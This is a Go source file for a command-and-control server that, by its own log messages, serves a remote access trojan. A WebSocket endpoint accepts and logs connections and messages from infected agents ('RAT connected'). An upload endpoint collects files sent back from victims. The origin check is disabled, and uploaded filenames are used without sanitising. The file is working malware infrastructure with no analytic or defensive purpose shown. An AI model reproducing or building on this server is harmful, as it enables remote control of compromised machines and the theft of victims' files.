package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"time"

	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
	// Allow all origins for now (for dev)
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

func main() {
	fmt.Println("🌐 C2 server running on :8080")
	http.HandleFunc("/ws", wsHandler)
	http.HandleFunc("/upload", uploadHandler)

	// Create upload folder if not exists
	os.MkdirAll("uploads", os.ModePerm)

	err := http.ListenAndServe(":8080", nil)
	if err != nil {
		panic(err)
	}
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		fmt.Println("❌ WebSocket upgrade failed:", err)
		return
	}
	defer conn.Close()

	fmt.Println("✅ RAT connected")

	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			fmt.Println("❌ Connection closed:", err)
			break
		}
		fmt.Printf("📥 [%s] %s\n", time.Now().Format("15:04:05"), string(msg))
	}
}

func uploadHandler(w http.ResponseWriter, r *http.Request) {
	r.ParseMultipartForm(10 << 20) // Max 10 MB

	file, handler, err := r.FormFile("file")
	if err != nil {
		fmt.Println("❌ Error retrieving file:", err)
		http.Error(w, "Failed to get file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	savePath := fmt.Sprintf("uploads/%d_%s", time.Now().Unix(), handler.Filename)
	dst, err := os.Create(savePath)
	if err != nil {
		fmt.Println("❌ Failed to save file:", err)
		http.Error(w, "Failed to save file", http.StatusInternalServerError)
		return
	}
	defer dst.Close()

	io.Copy(dst, file)
	fmt.Printf("✅ File uploaded: %s\n", savePath)
	w.Write([]byte("File uploaded successfully"))
}
